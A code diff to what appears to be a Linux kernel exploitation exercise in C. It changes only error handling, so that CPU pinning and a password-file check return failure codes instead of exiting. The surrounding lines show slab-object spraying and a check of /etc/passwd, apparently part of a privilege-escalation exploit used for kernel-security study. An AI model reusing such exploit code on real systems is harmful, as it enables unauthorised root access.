@@ -27,7 +27,7 @@
 #define STR_EXPAND(arg) #arg
 #define STR(arg) STR_EXPAND(arg)
 
-void do_cpu_pinning(void)
+int do_cpu_pinning(void)
 {
 	int ret = 0;
 	cpu_set_t single_cpu;
@@ -38,10 +38,11 @@ void do_cpu_pinning(void)
 	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
 	if (ret != 0) {
 		perror("[-] sched_setaffinity");
-		exit(EXIT_FAILURE);
+		return EXIT_FAILURE;
 	}
 
 	printf("[+] pinned to CPU #0\n");
+	return EXIT_SUCCESS;
 }
 
 int act(int act_fd, int code, int n, char *args)
@@ -169,7 +170,7 @@ int check_passwd(void)
 	/* Be sure that check_buf size is enough for pwd including null byte */
 	if (pwd_len >= CHECK_BUF_SZ) {
 		printf("[-] pwd_len is too big\n");
-		exit(EXIT_FAILURE);
+		return EXIT_FAILURE;
 	}
 
 	check_fd = open("/etc/passwd", O_RDONLY);
@@ -249,8 +250,8 @@ int main(void)
 	}
 	printf("[+] drill_act is opened\n");
 
-	printf("[!] pin the process to a single CPU\n");
-	do_cpu_pinning();
+	if (do_cpu_pinning() == EXIT_FAILURE)
+		goto end;
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
